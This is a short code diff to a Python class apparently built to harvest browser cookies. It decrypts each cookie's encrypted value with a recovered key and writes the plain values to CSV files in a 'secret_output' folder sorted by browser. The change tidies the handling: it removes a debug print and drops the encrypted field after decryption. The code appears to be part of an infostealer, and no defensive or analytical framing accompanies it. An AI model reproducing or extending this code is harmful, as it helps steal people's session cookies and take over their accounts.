@@ -202,10 +202,7 @@ class Broswer:
                 browser_path = secret_output / cookie["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
-                print(cookie["data"])
                 cookie_path = browser_path / content_type
-
-                cookie.pop("encrypted_value")
                 write_dict_to_csv(cookie_path, cookie["data"])
                      
     def browse_browser_data(self):
@@ -265,6 +262,7 @@ class Broswer:
                             try:
                                 if data["encrypted_value"]:
                                     data["value"] = self.decrypter(data["encrypted_value"], decrypt_key)
+                                    data.pop("encrypted_value")
                             except Exception as e:
                                 print(f"[-] Error decrypting cookies: {e}")        
                 else:
